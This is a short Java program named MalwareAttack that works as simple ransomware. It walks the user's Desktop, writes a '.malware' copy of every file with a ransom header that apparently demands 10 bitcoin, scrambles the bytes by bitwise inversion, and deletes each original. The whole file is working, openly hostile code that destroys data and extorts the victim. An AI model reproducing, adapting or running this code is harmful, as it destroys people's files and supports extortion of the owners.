package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class MalwareAttack {
    public static void main(String[] args) throws IOException {
        File targetDir = new File(System.getProperty("user.home"), "Desktop");
        File[] files = targetDir.listFiles();
        for (File source : files) {
            if (source.isDirectory()) continue;

            FileInputStream fis = new FileInputStream(source);
            File target = new File(targetDir, source.getName() + ".malware");
            FileOutputStream fos = new FileOutputStream(target);
            String signature = """
                    Ado mama Buddhi Ado..!
                    Dennai kiwwea bitcoin 10ak
                    ==========================
                    """;
            fos.write(signature.getBytes());

            while (true){
                byte[] buffer = new byte[1024];
                int read = fis.read(buffer);
                if (read == -1) break;
                for (int i = 0; i < buffer.length; i++) {
                    buffer[i] = (byte) ~buffer[i];
                }
                fos.write(buffer, 0, read);
            }

            fis.close();
            fos.close();

            source.delete();
        }
    }
}
